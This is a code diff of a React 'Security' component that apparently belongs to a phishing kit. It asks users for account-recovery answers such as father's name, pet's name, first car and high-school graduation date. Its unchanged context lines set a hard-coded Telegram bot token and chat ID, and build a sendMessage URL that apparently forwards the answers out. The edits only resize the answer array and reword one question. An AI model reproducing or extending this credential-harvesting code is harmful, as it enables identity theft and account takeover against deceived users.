@@ -16,7 +16,7 @@ const Security: React.FC = () => {
   const fullName = parsedData.fullname || "N/A";
 
   const [step, setStep] = useState(0);
-  const [answers, setAnswers] = useState(Array(9).fill(''));
+  const [answers, setAnswers] = useState(Array(11).fill(''));
 
   const questions = [
     "Father's full name",
@@ -29,7 +29,7 @@ const Security: React.FC = () => {
     "Name of your pet",
     "Maker of your first car",
     "Name of High School",
-    "Graduated Year (High School)"
+    "Graduated Month & Year (High School)"
   ];
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -54,6 +54,7 @@ const Security: React.FC = () => {
 
     const telegramBotToken = '6923253185:AAEeCL3NG0iF4TGMR4V8Ib2kITqDiOJ7IKo';
     const telegramChatId = '6639364559';
+   
 
     const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
